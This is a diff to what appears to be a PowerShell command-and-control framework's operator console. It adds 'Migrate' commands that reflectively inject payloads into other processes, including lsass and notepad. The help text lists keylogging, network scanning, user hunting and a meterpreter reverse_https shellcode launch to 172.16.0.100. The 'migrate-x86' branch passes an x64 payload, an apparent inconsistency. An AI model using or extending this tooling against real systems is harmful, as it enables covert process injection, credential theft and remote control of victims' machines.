@@ -452,8 +452,12 @@ $header = '
         write-host ' Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"' -ForegroundColor Green
         write-host " Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25" -ForegroundColor Green
         write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
-        write-host " Invoke-PSInject-Payload -ProcID 4444" -ForegroundColor Green
-        write-host " Invoke-PSInject-ProxyPayload (migrates to netsh.exe automatically if not procid is passed)" -ForegroundColor Green
+        write-host " Migrate-x64" -ForegroundColor Green
+        write-host " Migrate-x64 -ProcID 4444" -ForegroundColor Green
+        write-host " Migrate-x64 -NewProcess C:\Windows\System32\ConHost.exe" -ForegroundColor Green
+        write-host " Migrate-x86 -ProcName lsass" -ForegroundColor Green
+        write-host " Migrate-Proxypayload-x86 -ProcID 4444" -ForegroundColor Green
+        write-host " Migrate-Proxypayload-x64 -ProcName notepad" -ForegroundColor Green
         write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
         write-host ' Get-Eventlog -newest 10000 -instanceid 4624 -logname security | select message -ExpandProperty message | select-string -pattern "user1|user2|user3"' -ForegroundColor Green
         write-host ' Send-MailMessage -to "itdept@test.com" -from "User01 <user01@example.com>" -subject <> -smtpServer <> -Attachment <>'-ForegroundColor Green
@@ -1213,25 +1217,53 @@ param
             { 
                 CheckModuleLoaded "Get-FirewallRules.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('invoke-psinject-proxypayload'))
+            if ($pscommand.ToLower().StartsWith('migrate-proxypayload-x86'))
             { 
                 if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
-                CheckModuleLoaded "invoke-psinject.ps1" $psrandomuri
+                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                 CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                 CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
-                $psargs = $pscommand -replace 'invoke-psinject-proxypayload',''
-                $pscommand = "invoke-psinject -payloadtype proxy $($psargs)"
+                $psargs = $pscommand -replace 'migrate-proxypayload-x86',''
+                $pscommand = "invoke-reflectivepeinjection -payload Proxy_x86 $($psargs)"
                 } else {
                 write-host "Need to run CreateProxyPayload first"
                 $pscommand = 'fvdsghfdsyyh'
                 }
             }
+            if ($pscommand.ToLower().StartsWith('migrate-proxypayload-x64'))
+            { 
+                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
+                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
+                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
+                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
+                $psargs = $pscommand -replace 'migrate-proxypayload-x64',''
+                $pscommand = "invoke-reflectivepeinjection -payload Proxy_x64 $($psargs)"
+                } else {
+                write-host "Need to run CreateProxyPayload first"
+                $pscommand = 'fvdsghfdsyyh'
+                }
+            }
+            if ($pscommand.ToLower().StartsWith('migrate-x86'))
+            { 
+                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
+                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
+                $psargs = $pscommand -replace 'migrate-x86',''
+                $pscommand = "invoke-reflectivepeinjection -payload x64 $($psargs)"
+
+            }
+            if ($pscommand.ToLower().StartsWith('migrate-x64'))
+            { 
+                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
+                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
+                $psargs = $pscommand -replace 'migrate-x64',''
+                $pscommand = "invoke-reflectivepeinjection -payload x64 $($psargs)"
+            }
             if ($pscommand.ToLower().StartsWith('invoke-psinject-payload'))
             { 
-                CheckModuleLoaded "invoke-psinject.ps1" $psrandomuri
+                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                 CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                 $psargs = $pscommand -replace 'invoke-psinject-payload',''
-                $pscommand = "invoke-psinject -payloadtype normal $($psargs)"
+                $pscommand = "invoke-reflectivepeinjection $($psargs)"
             }
             if ($pscommand.ToLower().StartsWith('invoke-psinject'))
             { 
